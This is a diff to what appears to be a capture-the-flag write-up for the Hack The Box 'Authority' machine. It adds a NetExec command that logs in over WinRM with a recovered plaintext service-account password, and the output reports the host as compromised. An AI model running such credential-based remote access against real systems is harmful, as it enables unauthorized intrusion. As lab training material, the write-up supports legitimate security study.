@@ -385,3 +385,11 @@ SMB         10.129.229.56   445    AUTHORITY        SYSVOL          READ        
 ```
 This user has more access on the shares
 
+```python
+nxc winrm authority.authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
+WINRM       10.129.229.56   5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.229.56   5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
+```
+Also got access over winrm
